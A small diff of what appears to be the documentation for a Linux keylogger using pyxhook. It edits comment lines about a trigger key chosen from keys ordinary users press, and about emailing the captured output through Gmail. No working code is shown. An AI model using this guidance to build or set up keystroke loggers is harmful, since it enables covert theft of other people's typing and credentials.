@@ -20,11 +20,11 @@ http://dl.fedoraproject.org/pub/epel/7/x86_64/p/
  # 96 is the ascii value of the grave key (`), we should use any value that is generally press by a ordinary user
   If you want to modify or reuse this code, chose this value wisely
  
-# Email:
+ Email:
  """ If you want send mail using gmail then make change according to commected section bellow"""
  
  
- # pyxhook -- an extension to emulate some of the PyHook library on linux.
+  pyxhook -- an extension to emulate some of the PyHook library on linux.
 
     Copyright (C) 2008 Tim Alexander <dragonfyre13@gmail.com>
 
